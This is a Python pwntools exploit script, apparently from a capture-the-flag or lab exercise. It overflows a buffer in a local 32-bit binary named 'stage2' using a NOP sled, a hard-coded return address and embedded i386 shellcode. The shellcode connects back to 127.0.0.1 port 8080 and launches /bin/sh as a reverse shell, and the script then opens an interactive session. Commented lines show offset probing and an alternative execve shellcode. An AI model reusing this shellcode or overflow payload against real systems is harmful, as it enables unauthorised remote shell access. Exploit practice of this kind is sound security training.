#!/usr/bin/env python3

from pwn import *
from pprint import pprint
import os

context.update(arch='i386', os='linux')

elf = ELF("./stage2")
p = elf.process()

shellcode = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\xbf\x80\xff\xff\xfe\x83\xf7\xff\x57\x66\x68\x1f\x90\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x96\x66\xb8\x6a\x01\x89\xf3\x89\xe1\xb2\x10\xcd\x80\x31\xc0\x89\xf3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
#shellcode = b"\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
print(len(shellcode))


addr = 0xffffd050 #0xffffd070
offset = 112
nop_size = 0

gdb.attach(p, '''
break read_input
'''.format(addr))

print(p.recvline()) # welcome
#p.sendline(b"A"*200)
#p.sendline(cyclic(200))
#p.sendline(b"A"*112 + b"B"*4)
#p.sendline(b"A"*23 + shellcode + b"BBBB")
#p.sendline(b"\xcc"*23 + shellcode + p32(addr))
payload = b"\x90"*(offset-len(shellcode)-3) + shellcode + b"\xCC"*3 + p32(addr) 

with open('payload', 'wb') as f:
    f.write(payload)

p.sendline(payload)

#payload = shellcode + b"A"*(offset-nop_size-len(shellcode)) + b"C"*8 #p32(addr)
#print(len(payload))
#with open('x', 'wb') as f:
#    f.write(payload)
#p.sendline(payload)


#print(p.recvall())
p.interactive()

